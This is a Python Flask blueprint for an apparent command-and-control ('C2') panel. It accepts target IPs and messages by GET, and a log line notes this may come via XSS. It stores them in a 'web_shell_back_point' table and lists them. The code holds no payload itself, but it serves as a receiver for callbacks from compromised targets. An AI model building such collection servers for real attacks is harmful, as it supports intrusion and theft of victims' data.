from flask import Blueprint, jsonify, request, render_template, redirect, url_for, flash
import os
import json
from config.config import log_function_call, LogConfig
from instance.models import web_shell_back_point, db
from datetime import datetime

control_bp = Blueprint('control', __name__)


@control_bp.route('/add_message', methods=['POST', 'GET'])  # type: ignore
@log_function_call()
def add_message():
    try:
        logger = LogConfig.get_context_logger()

        if request.method == 'POST':
            logger.info("用戶請求添加消息 (POST)")
            # 使用 request.form 獲取表單數據
            message = request.form.get('message')
            target_ip = request.form.get('target_ip')
        elif request.method == 'GET':
            logger.info("用戶使用GET方法上傳消息 (可能通過XSS)")
            # 使用 request.args 獲取 URL 參數
            message = request.args.get('message')
            target_ip = request.args.get('target_ip')

        if not message:
            if request.method == 'GET':
                return jsonify({'error': '消息不能為空', 'help': '使用方式: /add_message?message=你的消息&target_ip=目標IP'}), 400
            else:
                flash('消息不能為空！', 'error')
                return redirect(url_for('control.get_messages'))

        new_message = web_shell_back_point(
            target_ip=target_ip,
            target_config=message,
            created_at=datetime.now()
        )
        db.session.add(new_message)
        db.session.commit()

        if request.method == 'GET':
            return jsonify({
                'status': 'success',
                'message': '消息添加成功！',
                'data': {
                    'target_ip': target_ip,
                    'message': message,
                    'timestamp': datetime.now().isoformat()
                }
            }), 200
        else:
            flash('消息添加成功！', 'success')
            return redirect(url_for('control.get_messages'))

    except Exception as e:
        logger.error(f"添加消息時發生錯誤: {e}")
        if request.method == 'GET':
            return jsonify({'error': str(e)}), 500
        else:
            flash(f'發生錯誤: {str(e)}', 'error')
            return redirect(url_for('control.get_messages'))


@control_bp.route('/get_messages', methods=['GET'])  # type: ignore
@log_function_call()
def get_messages():
    try:
        logger = LogConfig.get_context_logger()
        logger.info("用戶請求獲取消息")
        messages = web_shell_back_point.query.all()
        if not messages:
            return render_template('C2_control/control_message.html', messages=[])
        return render_template('C2_control/control_message.html', messages=messages)
    except Exception as e:
        logger.error(f"獲取消息時發生錯誤: {e}")
        return jsonify({'error': str(e)}), 500


@control_bp.route('/help', methods=['GET'])  # type: ignore
@log_function_call()
def help_page():
    """
    顯示 C2 控制面板的 HTML 格式使用說明和 API 文檔
    """
    try:
        logger = LogConfig.get_context_logger()
        logger.info("用戶請求查看幫助頁面")

        # 從JSON文件讀取幫助信息
        try:
            with open('config/control_help.json', 'r', encoding='utf-8') as f:
                help_info = json.load(f)
        except FileNotFoundError:
            logger.error("找不到幫助配置文件: config/control_help.json")
            flash('幫助配置文件不存在', 'error')
            return redirect(url_for('control.get_messages'))
        except json.JSONDecodeError as e:
            logger.error(f"解析JSON配置文件失敗: {e}")
            flash('JSON配置文件格式錯誤', 'error')
            return redirect(url_for('control.get_messages'))

        # 總是返回HTML格式
        return render_template('C2_control/help.html', help_info=help_info)

    except Exception as e:
        logger.error(f"顯示幫助頁面時發生錯誤: {e}")
        flash(f'發生錯誤: {str(e)}', 'error')
        return redirect(url_for('control.get_messages'))
